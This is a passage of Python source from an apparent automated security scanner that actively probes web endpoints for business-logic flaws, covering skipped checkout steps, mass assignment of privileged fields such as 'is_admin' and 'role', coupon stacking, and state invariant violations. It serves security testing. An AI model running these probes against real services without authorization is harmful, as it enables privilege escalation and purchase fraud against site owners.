            skipped_steps = [sequence.steps[i].name for i in sequence.skip_step_indices if i < len(sequence.steps)]
            evidence_snippet = (
                f"Workflow '{sequence.name}' successfully reached fulfillment at '{endpoint_url}' "
                f"while skipping steps: {skipped_steps}. Response (HTTP {final_response.status_code}): {body_str[:150]}"
            )
            return BusinessLogicResult(
                technique=BusinessLogicTechnique.WORKFLOW_STEP_SKIP.value,
                strategy=BusinessLogicMutationStrategy.OUT_OF_SEQUENCE_DISPATCH.value,
                severity=BusinessLogicSeverity.CRITICAL.value,
                confidence=0.98,
                payload={"skipped_steps": skipped_steps, "executed_steps": [r.step_name for r in responses]},
                matched_signature="workflow_intermediate_step_skip_fulfilled",
                evidence_snippet=evidence_snippet,
                endpoint_url=endpoint_url,
                parameter="step_sequence",
                status_code=final_response.status_code,
                cwe_id="CWE-840",
                cvss_score=9.8,
                workflow_trace=trace,
            )

        return None

    @classmethod
    def analyze_mass_assignment(
        cls,
        endpoint_url: str,
        probe: BusinessLogicProbe,
        response: BusinessLogicProbeResponse,
        injected_field: Optional[str] = None,
        injected_val: Optional[Any] = None,
    ) -> Optional[BusinessLogicResult]:
        """
        Analyzes profile/user update responses to detect whether privileged fields
        (e.g., is_admin, role, verified, tier) were accepted and persisted.
        """
        if cls.is_hardened_defense(response.status_code, response.body):
            return None

        if response.status_code not in (200, 201, 204):
            return None

        field_name = injected_field or probe.metadata.get("injected_field", "role")
        field_val = injected_val if injected_val is not None else probe.metadata.get("injected_value", "admin")

        json_obj = response.json_data if isinstance(response.json_data, dict) else {}
        body_str = response.body

        # Check if the privileged field is reflected as assigned/accepted
        is_assigned = False
        if isinstance(json_obj, dict):
            user_data = json_obj.get("user") or json_obj.get("data") or json_obj
            if isinstance(user_data, dict):
                if field_name in user_data:
                    reflected_val = user_data[field_name]
                    # Verify matching or truthy reflection of the injected privileged value
                    if reflected_val == field_val:
                        is_assigned = True
                    elif field_val is True and reflected_val in (True, 1, "true", "True", "admin"):
                        is_assigned = True
                    elif str(field_val).lower() == str(reflected_val).lower() and str(reflected_val).lower() not in ("false", "0", "null", "none", "user", "guest", "member", "customer"):
                        is_assigned = True
                elif field_name == "is_admin" and user_data.get("role") in ("admin", "administrator", "superuser"):
                    is_assigned = True
                elif field_name == "role" and (user_data.get("role") in ("admin", "administrator", "superuser") or user_data.get("is_admin") is True):
                    is_assigned = True

        if not is_assigned:
            # Fallback to precise string reflection of the injected privileged value
            lower_body = body_str.lower()
            if field_val is True and ('"is_admin": true' in lower_body or f'"{field_name}": true' in lower_body or f'"{field_name}": 1' in lower_body):
                is_assigned = True
            elif field_name == "role" and ('"role": "admin"' in lower_body or '"role": "administrator"' in lower_body or '"role": "superuser"' in lower_body):
                is_assigned = True
            elif field_name == "is_admin" and ('"is_admin": true' in lower_body or '"is_admin": 1' in lower_body):
                is_assigned = True
            elif field_val is not None and str(field_val).lower() not in ("false", "0", "null", "none", "user", "guest", "member", "customer") and (
                f'"{field_name}": "{str(field_val).lower()}"' in lower_body
                or f'"{field_name}": {str(field_val).lower()}' in lower_body
            ):
                is_assigned = True

        if is_assigned:
            severity = BusinessLogicSeverity.CRITICAL.value if field_name in ("is_admin", "admin", "is_superuser", "role", "permissions") else BusinessLogicSeverity.HIGH.value
            cvss_score = 9.8 if severity == BusinessLogicSeverity.CRITICAL.value else 8.1
            evidence_snippet = (
                f"Mass assignment parameter injection for privileged field '{field_name}'={field_val} "
                f"was accepted and persisted by server (HTTP {response.status_code}): {body_str[:150]}"
            )
            return BusinessLogicResult(
                technique=BusinessLogicTechnique.MASS_ASSIGNMENT.value,
                strategy=str(probe.mutation_strategy),
                severity=severity,
                confidence=0.96,
                payload=probe.json_data or probe.data or probe.params,
                matched_signature=f"mass_assignment_{field_name}_persisted",
                evidence_snippet=evidence_snippet,
                endpoint_url=endpoint_url,
                parameter=field_name,
                status_code=response.status_code,
                cwe_id="CWE-915",
                cvss_score=cvss_score,
            )

        return None

    @classmethod
    def analyze_coupon_stacking(
        cls,
        endpoint_url: str,
        responses: List[BusinessLogicProbeResponse],
        original_total: float = 100.0,
        final_total: Optional[float] = None,
        discount_applied: Optional[float] = None,
    ) -> Optional[BusinessLogicResult]:
        """
        Analyzes coupon application probes to identify coupon stacking, idempotency abuse,
        or negative cart totals resulting from repeated discount applications.
        """
        if not responses:
            return None

        # Check if all responses were hardened defenses
        successful_responses = [r for r in responses if not cls.is_hardened_defense(r.status_code, r.body) and r.status_code in (200, 201)]
        if not successful_responses:
            return None

        last_resp = successful_responses[-1]
        json_obj = last_resp.json_data if isinstance(last_resp.json_data, dict) else {}
        observed_total = final_total if final_total is not None else json_obj.get("total", json_obj.get("cart_total", json_obj.get("amount", None)))
        observed_discount = discount_applied if discount_applied is not None else json_obj.get("discount", json_obj.get("discount_amount", None))

        # If only 1 successful response, ensure it actually represents a flaw (e.g. negative total or multi-coupon array)
        if len(successful_responses) <= 1:
            tot = observed_total
            if tot is not None and isinstance(tot, (int, float)) and tot < 0:
                pass
            elif isinstance(json_obj.get("applied_coupons"), list) and len(json_obj["applied_coupons"]) > 1:
                pass
            else:
                return None  # Normal single coupon application is legitimate behavior

        is_vulnerable = False
        matched_sig = ""
        evidence_snippet = ""

        # 1. Negative total cart balance
        if observed_total is not None and isinstance(observed_total, (int, float)) and observed_total < 0:
            is_vulnerable = True
            matched_sig = "coupon_stacking_negative_balance"
            evidence_snippet = f"Multiple coupon applications generated a negative total balance: {observed_total} (Original: {original_total})"

        # 2. Explicit discount stack in json
        elif isinstance(json_obj.get("applied_coupons"), list) and len(json_obj["applied_coupons"]) > 1:
            is_vulnerable = True
            matched_sig = "coupon_stacking_multi_code_accepted"
            evidence_snippet = f"Server accepted multiple non-stackable coupons: {json_obj['applied_coupons']}"

        # 3. Cumulative discount exceeding individual coupon value (e.g. 20% applied multiple times -> 60%)
        elif len(successful_responses) > 1 and (
            (observed_discount is not None and isinstance(observed_discount, (int, float)) and observed_discount > 20.0)
            or (observed_total is not None and isinstance(observed_total, (int, float)) and observed_total < original_total * 0.7)
        ):
            is_vulnerable = True
            matched_sig = "coupon_reapplication_idempotency_bypass"
            evidence_snippet = (
                f"Single-use coupon was repeatedly applied {len(successful_responses)} times resulting in cumulative "
                f"discount={observed_discount} / total={observed_total} (Original: {original_total})"
            )

        if is_vulnerable:
            severity = BusinessLogicSeverity.HIGH.value if (observed_total is not None and observed_total >= 0) else BusinessLogicSeverity.CRITICAL.value
            cvss_score = 8.6 if severity == BusinessLogicSeverity.HIGH.value else 9.8
            return BusinessLogicResult(
                technique=BusinessLogicTechnique.COUPON_STACKING.value,
                strategy=BusinessLogicMutationStrategy.BOUNDARY_NEGATIVE_INJECTION.value,
                severity=severity,
                confidence=0.95,
                payload={"responses_count": len(responses), "observed_total": observed_total, "observed_discount": observed_discount},
                matched_signature=matched_sig,
                evidence_snippet=evidence_snippet,
                endpoint_url=endpoint_url,
                parameter="coupon_code",
                status_code=last_resp.status_code,
                cwe_id="CWE-799",
                cvss_score=cvss_score,
                pre_state={"original_total": original_total},
                post_state={"final_total": observed_total},
            )

        return None

    @classmethod
    def analyze_differential_state(
        cls,
        endpoint_url: str,
        technique: str,
        strategy: str,
        pre_state: Any,
        post_state: Any,
        expected_post_state: Any,
        response: Optional[BusinessLogicProbeResponse] = None,
    ) -> Optional[BusinessLogicResult]:
        """
        Compares observed pre-state and post-state against the business rule invariant.
        Detects financial balance inconsistencies, privilege escalation state deltas,
        or workflow state violations.
        """
        if response and cls.is_hardened_defense(response.status_code, response.body):
            return None

        # Check for invariant violation
        if post_state == expected_post_state:
            return None  # Invariant held cleanly

        status_code = response.status_code if response else 200
        delta = {"pre_state": pre_state, "post_state": post_state, "expected_post_state": expected_post_state}
        evidence_snippet = (
            f"Differential state invariant violation at '{endpoint_url}': "
            f"Pre-state: {pre_state} -> Post-state: {post_state} (Expected: {expected_post_state})"
        )

        return BusinessLogicResult(
            technique=technique,
            strategy=strategy,
            severity=BusinessLogicSeverity.HIGH.value,
            confidence=0.95,
            payload=delta,
            matched_signature="differential_state_invariant_violation",
            evidence_snippet=evidence_snippet,
            endpoint_url=endpoint_url,
            parameter="state_invariant",
            status_code=status_code,
            cwe_id="CWE-840",
            cvss_score=8.5,
            pre_state=pre_state,
            post_state=post_state,
            state_delta=delta,
        )


# ============================================================================
# Stateful Workflow Prober
# ============================================================================

class StatefulWorkflowProber:
    """
    Executes discrete probes and multi-step workflow sequences against target endpoints.
    Maintains session state, cookie jars, extracted variables, and supports custom
    transport adapters for hermetic mock testing.
    """

    def __init__(
        self,
        http_client: Optional[AuthenticatedHttpClient] = None,
        transport_adapter: Optional[Callable[..., Any]] = None,
    ):
        self.http_client = http_client
        self.transport_adapter = transport_adapter
        self.session_variables: Dict[str, Any] = {}

    def _interpolate_value(self, val: Any, context: Dict[str, Any]) -> Any:
        """Recursively replaces template placeholders (e.g. '{cart_id}') with context variables."""
        if isinstance(val, str):
            res = val
            for k, v in context.items():
                res = res.replace(f"{{{k}}}", str(v))
            return res
        elif isinstance(val, dict):
            return {k: self._interpolate_value(v, context) for k, v in val.items()}
        elif isinstance(val, list):
            return [self._interpolate_value(x, context) for x in val]
        return val

    def _extract_json_field(self, data: Any, path: str) -> Any:
        """Extracts nested field from dictionary using dot notation (e.g. 'data.id')."""
        if not path or data is None:
            return None
        parts = path.split(".")
        curr = data
        for part in parts:
            if isinstance(curr, dict) and part in curr:
                curr = curr[part]
            elif isinstance(curr, list) and part.isdigit() and int(part) < len(curr):
                curr = curr[int(part)]
            else:
                return None
        return curr

    def execute_probe(
        self,
        probe: BusinessLogicProbe,
        session_state: Optional[Dict[str, Any]] = None,
    ) -> BusinessLogicProbeResponse:
        """
        Executes a single discrete BusinessLogicProbe using the configured transport.
        """
        ctx = dict(self.session_variables)
        if session_state:
            ctx.update(session_state)

        interpolated_url = self._interpolate_value(probe.endpoint_url, ctx)
        interpolated_json = self._interpolate_value(probe.json_data, ctx)
        interpolated_data = self._interpolate_value(probe.data, ctx)
        interpolated_params = self._interpolate_value(probe.params, ctx)

        # 1. Custom Transport Adapter (Mocking / Testing)
        if self.transport_adapter:
            try:
                res = self.transport_adapter(
                    method=probe.method,
                    url=interpolated_url,
                    headers=probe.headers,
                    json=interpolated_json,
                    data=interpolated_data,
                    params=interpolated_params,
                )
                if isinstance(res, BusinessLogicProbeResponse):
                    if not res.endpoint_url:
                        res.endpoint_url = interpolated_url
                    if not res.step_name:
                        res.step_name = probe.name
                    return res
                elif hasattr(res, "status_code"):
                    body = getattr(res, "text", "") or ""
                    json_data = None
                    try:
                        json_data = res.json() if callable(getattr(res, "json", None)) else getattr(res, "json_data", None)
                    except Exception:
                        pass
                    return BusinessLogicProbeResponse(
                        step_name=probe.name,
                        status_code=res.status_code,
                        headers=dict(getattr(res, "headers", {})),
                        body=body,
                        json_data=json_data,
                        endpoint_url=interpolated_url,
                        raw_response=res,
                    )
            except Exception as ex:
                return BusinessLogicProbeResponse(
                    step_name=probe.name,
                    status_code=0,
                    error=str(ex),
                    endpoint_url=interpolated_url,
                )

        # 2. AuthenticatedHttpClient Execution
        if self.http_client:
            try:
                resp = self.http_client.send_request(
                    method=probe.method,
                    url=interpolated_url,
                    headers=probe.headers,
                    json=interpolated_json,
                    data=interpolated_data,
                    params=interpolated_params,
                )
                body = getattr(resp, "text", "") or ""
                json_data = None
                try:
                    if body:
                        json_data = json.loads(body)
                except Exception:
                    pass
                return BusinessLogicProbeResponse(
                    step_name=probe.name,
                    status_code=getattr(resp, "status_code", 200),
                    headers=dict(getattr(resp, "headers", {})),
                    body=body,
                    json_data=json_data,
                    endpoint_url=interpolated_url,
                    raw_response=resp,
                )
            except Exception as ex:
                return BusinessLogicProbeResponse(
                    step_name=probe.name,
                    status_code=0,
                    error=str(ex),
                    endpoint_url=interpolated_url,
                )

        # Fallback dummy response if no client or transport configured
        return BusinessLogicProbeResponse(
            step_name=probe.name,
            status_code=200,
            body='{"status": "ok"}',
            json_data={"status": "ok"},
            endpoint_url=interpolated_url,
        )

    def execute_workflow(
        self,
        sequence: WorkflowSequence,
        session_state: Optional[Dict[str, Any]] = None,
    ) -> List[BusinessLogicProbeResponse]:
        """
        Executes a sequence of workflow steps, automatically extracting variables
        from step responses and skipping designated steps in skip_step_indices.
        """
        responses: List[BusinessLogicProbeResponse] = []
        ctx = dict(self.session_variables)
        if session_state:
            ctx.update(session_state)

        for idx, step in enumerate(sequence.steps):
            if idx in sequence.skip_step_indices:
                logger.debug("Skipping workflow step %d: %s", idx, step.name)
                continue

            probe = BusinessLogicProbe(
                name=step.name,
                endpoint_url=step.url,
                method=step.method,
                headers=step.headers,
                json_data=step.json_data,
                data=step.data,
                params=step.params,
                technique=BusinessLogicTechnique.WORKFLOW_STEP_SKIP,
                mutation_strategy=BusinessLogicMutationStrategy.OUT_OF_SEQUENCE_DISPATCH,
            )

            resp = self.execute_probe(probe, session_state=ctx)
            responses.append(resp)

            # Extract fields into context
            if step.extract_fields and resp.json_data:
                for ctx_key, json_path in step.extract_fields.items():
                    extracted_val = self._extract_json_field(resp.json_data, json_path)
                    if extracted_val is not None:
                        ctx[ctx_key] = extracted_val
                        self.session_variables[ctx_key] = extracted_val

        return responses


# ============================================================================
# Business Logic Collector
# ============================================================================

class BusinessLogicCollector(BaseCollector):
    """
    Business Logic Flaws & State Machine Security Detection Collector.

    Discovers candidate business endpoints, orchestrates stateful probing,
    and publishes confirmed findings via Quadruple State Publishing.
    """

    DEFAULT_CANDIDATE_PATHS = [
        "/api/checkout",
        "/api/v1/checkout",
        "/checkout",
        "/checkout/pay",
        "/checkout/fulfill",
        "/checkout/complete",
        "/api/cart",
        "/api/cart/add",
        "/api/cart/apply-coupon",
        "/cart/discount",
        "/api/users/profile",
        "/api/v1/users/me",
        "/api/users/role",
        "/api/account/upgrade",
        "/api/register",
        "/api/order/create",
        "/api/order/verify",
        "/api/subscription/upgrade",
        "/api/coupon/redeem",
    ]

    def __init__(
        self,
        http_client: Optional[AuthenticatedHttpClient] = None,
        generator: Optional[BusinessLogicPayloadGenerator] = None,
        analyzer: Optional[BusinessLogicSecurityAnalyzer] = None,
        prober: Optional[StatefulWorkflowProber] = None,
        transport_adapter: Optional[Callable[..., Any]] = None,
    ):
        self.http_client = http_client
        self.generator = generator or BusinessLogicPayloadGenerator()
        self.analyzer = analyzer or BusinessLogicSecurityAnalyzer()
        self.prober = prober or StatefulWorkflowProber(http_client=http_client, transport_adapter=transport_adapter)
        self.results: List[BusinessLogicResult] = []

    def _discover_candidate_endpoints(self, mission: Any) -> List[str]:
        """Discovers candidate business logic and state machine endpoints from mission."""
        candidates: Set[str] = set()
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))

        # 1. Inspect mission.endpoints
        endpoints = getattr(raw_mission, "endpoints", []) or []
        for ep in endpoints:
            url_str = ep.get("url", ep) if isinstance(ep, dict) else str(ep)
            parsed = urllib.parse.urlparse(url_str)
            path_lower = parsed.path.lower()
            if any(k in path_lower for k in ("checkout", "cart", "pay", "order", "coupon", "promo", "voucher", "upgrade", "role", "profile", "account", "register", "step", "fulfill", "billing")):
                candidates.add(url_str)

        # 2. Inspect mission.live_hosts
        live_hosts = getattr(raw_mission, "live_hosts", []) or []
        for lh in live_hosts:
            host_str = lh.get("url", lh) if isinstance(lh, dict) else str(lh)
            parsed = urllib.parse.urlparse(host_str)
            base = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else host_str
            for p in self.DEFAULT_CANDIDATE_PATHS:
                candidates.add(urllib.parse.urljoin(base, p))

        # 3. Fallback to mission.target
        target = getattr(raw_mission, "target", "") or ""
        if not candidates and target:
            base = target if target.startswith("http") else f"https://{target}"
            parsed_b = urllib.parse.urlparse(base)
            root_url = f"{parsed_b.scheme}://{parsed_b.netloc}" if parsed_b.netloc else base
            for candidate_path in self.DEFAULT_CANDIDATE_PATHS:
                candidates.add(urllib.parse.urljoin(root_url, candidate_path))

        return sorted(list(candidates))

    def _publish_finding(
        self,
        mission: Any,
        result: BusinessLogicResult,
        base_url: str,
        target_url: str,
    ) -> Evidence:
        """
        Executes Quadruple State Updates:
        1. raw_mission.evidence.add(ev)
        2. raw_mission.vulnerabilities.append({...})
        3. raw_mission.attack_surface_graph node & edge creation (HAS_ENDPOINT, HAS_VULNERABILITY)
        4. ControlledMission finding publishing
        """
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))
        parsed = urllib.parse.urlparse(target_url)
        url_path = parsed.path or "/"

        cwe_id = result.cwe_id
        cvss_score = result.cvss_score
        tech_title = result.technique.replace("_", " ").title()

        title_map = {
            BusinessLogicTechnique.PRICE_TAMPERING.value: f"Business Logic Price & Quantity Tampering: {target_url}",
            BusinessLogicTechnique.WORKFLOW_STEP_SKIP.value: f"Multi-Step Workflow State Transition Skip: {target_url}",
            BusinessLogicTechnique.MASS_ASSIGNMENT.value: f"Mass Assignment Privilege Escalation: {target_url}",
            BusinessLogicTechnique.COUPON_STACKING.value: f"Coupon Stacking & Idempotency Abuse: {target_url}",
            BusinessLogicTechnique.DIFFERENTIAL_STATE_VERIFICATION.value: f"Differential Business Logic State Invariant Violation: {target_url}",
        }
        title_base = title_map.get(result.technique, f"Business Logic Vulnerability ({tech_title}): {target_url}")

        description = (
            f"Business Logic & State Machine validation on '{target_url}' identified a vulnerability using technique '{result.technique}' "
            f"under strategy '{result.strategy}'.\n"
            f"Evidence: {result.evidence_snippet}\n"
            f"CWE: {cwe_id} (CVSS: {cvss_score})"
        )

        ev = Evidence(
            category="business_logic",
            value=f"{result.technique}:{target_url}",
            source="business_logic",
            status="CONFIRMED",
            severity=result.severity,
            confidence=result.confidence,
            title=title_base,
            description=description,
            provenance=ProvenanceData(
                step_id="business_logic_collector",
            ),
            tags=[
                "business_logic",
                "state_machine",
                result.technique,
                result.strategy,
                result.template_id,
                cwe_id.lower(),
            ],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "category": "business_logic",
                "severity": result.severity,
                "confidence": result.confidence,
                "vulnerability_type": result.technique,
                "technique": result.technique,
                "strategy": result.strategy,
                "mutation_strategy": result.strategy,
                "matched_signature": result.matched_signature,
                "template_id": result.template_id,
                "status_code": result.status_code,
                "evidence_snippet": result.evidence_snippet[:250],
                "payload": str(result.payload)[:300],
                "parameter": result.parameter or "business_logic_param",
                "cwe_id": cwe_id,
                "cvss_score": cvss_score,
                "pre_state": str(result.pre_state),
                "post_state": str(result.post_state),
                "state_delta": str(result.state_delta),
            },
        )

        # 1. Update raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Update raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": title_base,
                "template_id": result.template_id,
                "severity": result.severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "technique": result.technique,
                "strategy": result.strategy,
                "cwe_id": cwe_id,
                "cvss_score": cvss_score,
            })

        # 3. AttackSurfaceGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{result.template_id}:{target_url}:{result.technique}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": result.status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=title_base, metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. ControlledMission wrapper publish
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id, ev)
            except Exception:
                pass

        return ev

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes active business logic & state machine probes across candidate endpoints.
        """
        discovered_candidates = self._discover_candidate_endpoints(mission)
        evidence_list: List[Evidence] = []
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))

        for target_url in discovered_candidates:
            parsed = urllib.parse.urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else target_url
            path_lower = parsed.path.lower()

            # 1. Price / Quantity parameter tampering probe
            if any(k in path_lower for k in ("checkout", "cart", "pay", "order", "price", "amount")):
                probes = self.generator.build_price_tampering_payloads(target_url)
                for probe in probes:
                    resp = self.prober.execute_probe(probe)
                    res = self.analyzer.analyze_price_tampering(target_url, probe, resp)
                    if res is not None:
                        self.results.append(res)
                        ev = self._publish_finding(mission, res, base_url, target_url)
                        evidence_list.append(ev)
                        break

            # 2. Mass Assignment probe
            if any(k in path_lower for k in ("user", "profile", "account", "role", "register", "member")):
                probes = self.generator.build_mass_assignment_payloads(target_url)
                for probe in probes:
                    resp = self.prober.execute_probe(probe)
                    res = self.analyzer.analyze_mass_assignment(target_url, probe, resp)
                    if res is not None:
                        self.results.append(res)
                        ev = self._publish_finding(mission, res, base_url, target_url)
                        evidence_list.append(ev)
                        break

            # 3. Coupon Stacking probe
            if any(k in path_lower for k in ("coupon", "discount", "promo", "voucher", "redeem")):
                probes = self.generator.build_coupon_stacking_payloads(target_url)
                responses = [self.prober.execute_probe(p) for p in probes]
                res = self.analyzer.analyze_coupon_stacking(target_url, responses)
                if res is not None:
                    self.results.append(res)
                    ev = self._publish_finding(mission, res, base_url, target_url)
                    evidence_list.append(ev)

            # 4. Multi-Step Workflow Skip probe
            if any(k in path_lower for k in ("fulfill", "complete", "step", "verify", "finish")):
                seq = self.generator.build_workflow_skip_sequence(base_url)
                responses = self.prober.execute_workflow(seq)
                res = self.analyzer.analyze_workflow_step_skip(target_url, seq, responses)
                if res is not None:
                    self.results.append(res)
                    ev = self._publish_finding(mission, res, base_url, target_url)
                    evidence_list.append(ev)

        return evidence_list

    # Pipeline runner compatibility alias
    execute = collect


# Backwards compatibility alias
BusinessLogicFlawsCollector = BusinessLogicCollector
